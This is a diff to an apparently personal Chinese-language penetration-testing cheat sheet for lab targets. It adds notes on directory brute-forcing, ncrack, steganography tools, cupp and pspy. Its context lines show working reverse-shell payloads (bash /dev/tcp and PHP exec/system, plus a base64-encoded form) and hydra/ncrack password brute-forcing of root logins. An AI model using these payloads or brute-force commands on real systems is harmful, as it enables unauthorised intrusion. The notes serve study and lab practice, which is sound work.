@@ -90,6 +90,17 @@ gobuster dir -u 'http://192.168.6.166/' -w /usr/share/wordlists/dirbuster/direct
 gobuster fuzz -u 'http://192.168.6.166/' -c 'PHPSESSID=6kbbdns7ne5fr2a71146mio2vn' -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --exclude-length 1128
 ```
 
+## feroxbuster
+
+迭代爆破路径（kali不内置）
+
+```bash
+#-t指定线程数，-x指定扩展名，-r进一步递归扫描子目录（原先只递归扫描一层）
+feroxbuster -u http://192.168.6.249 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+#设置请求头
+feroxbuster -u http://192.168.6.249 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt --headers "User-Agent: CustomUserAgent" "Cookie: PHPSession=xxx"
+```
+
 ## wfuzz
 
 使用模糊测试的方法爆破路径，例如已知存在路径/scout/xxx/docs/，要获得xxx
@@ -166,13 +177,14 @@ bash -i >& /dev/tcp/192.168.6.149/5555 0>&1
 
 ###PS：这个是用于上传一个反弹shell使得每次访问就可以执行这个反弹shell的
 #PHP的（eval不能用，因为eval执行的是php代码不是系统命令）
+####system()的内容是字符串时，内容必须要被引起来，可以用\转义符
 <?php exec('/bin/bash -c "bash -i >& /dev/tcp/192.168.6.149/6666 0>&1"') ?>
 <?php system('/bin/bash -c "bash -i >& /dev/tcp/192.168.6.149/6666 0>&1"') ?>
 #之所有不能直接使用bash -i，而还要使用/bin/bash -c声明解释器是因为php的system默认使用的/bin/sh是dash而不是bash，就算后边有bash -i，也是将整个命令先传递给默认shell(dash)解析后显示调用bash，但是dash是解析不了>&这些符号的，所以调用了bash也没用，无法建立反弹shell。
 #而直接在命令行输入可以建立是因为对命令行来说这是一个显示的调用bash处理的命令，而并不会先由默认的shell(dash)解析，所以可以建立反弹shell。
 
 
-###PS：这个是用于访问$_GET['cmd']的时候传入的命令，URL会错误解析>&，所以需要用base64
+###PS：这个是用于访问system($_GET['cmd']);的时候传入的命令，URL会错误解析>&，所以需要用base64
 #反向连接base64编码其中特别注意-i和7777后都有两个空格（即>或者&前应该多一个空格），用base64编码，后边用url编码
 echo "bash -i  >& /dev/tcp/192.168.6.149/7777  0>&1" |base64 -d |bash
 echo "YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkyLjE2OC42LjE0OS83Nzc3ICAwPiYx"%20%7cbase64%20-d%20%7cbash
@@ -265,6 +277,15 @@ hydra -l username -P dictionary ssh://ip(:port)
 #用post方式爆破
 #:后边跟的是登录失败提示的错误消息，和每个网站的设计有关
 hydra -l root -P /usr/share/wordlists/rockyou.txt -t 64 192.168.6.158 http-post-form "/index.php:username=^USER^&password=^PASS^:Error with user or password"
+```
+
+## ncrack
+
+比hydra更快的爆破工具
+
+```bash
+#T指定扫描等级，5是最快
+ncrack -T5 -l root -P password.txt protocol_type://192.168.6.249:port
 ```
 
 ## OpenSSL
@@ -437,5 +458,43 @@ smbclient \\\\192.168.6.173\\DebianShare -U guest
 dir
 #获取文件（会自动下载到运行smbclient时的目录）
 get file_name
+```
+
+## steghide
+
+隐写分析工具(不是很好用)
+
+```bash
+steghide info file_name
+```
+
+## exiftool
+
+隐写分析工具，相对好用，file命令其实最省劲
+
+```bash
+exiftool file_name
+```
+
+## cupp
+
+社会工程字典生成器
+
+```bash
+#交互模式(可以输入为空)
+python3 cupp -i
+```
+
+## pspy
+
+可以下载和上传到靶机中直接使用，无需安装，只需要给权限就可以
+
+用于监控进程，能够看到每个进程的权限，**进程启动时所执行的命令**
+
+没出现一个新的UID和PID，就会打印出一行
+
+```bash
+#直接./运行
+./pspy
 ```
 
